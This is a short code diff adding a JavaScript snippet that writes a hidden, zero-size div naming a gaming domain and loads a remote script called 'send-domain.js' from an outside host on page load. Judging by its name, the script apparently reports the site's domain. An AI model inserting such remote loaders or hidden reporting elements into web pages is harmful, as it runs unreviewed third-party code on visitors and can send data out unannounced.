@@ -1,0 +1,6 @@
+document.write(`
+
+<div id="Client"></div>
+<div class="demo-container" style="font-size:0;" hidden>juegos.lazonagamer.net</div>
+<script src="https://gxcdn.xyz/domain-system/send-domain.js"><\/script>
+`)
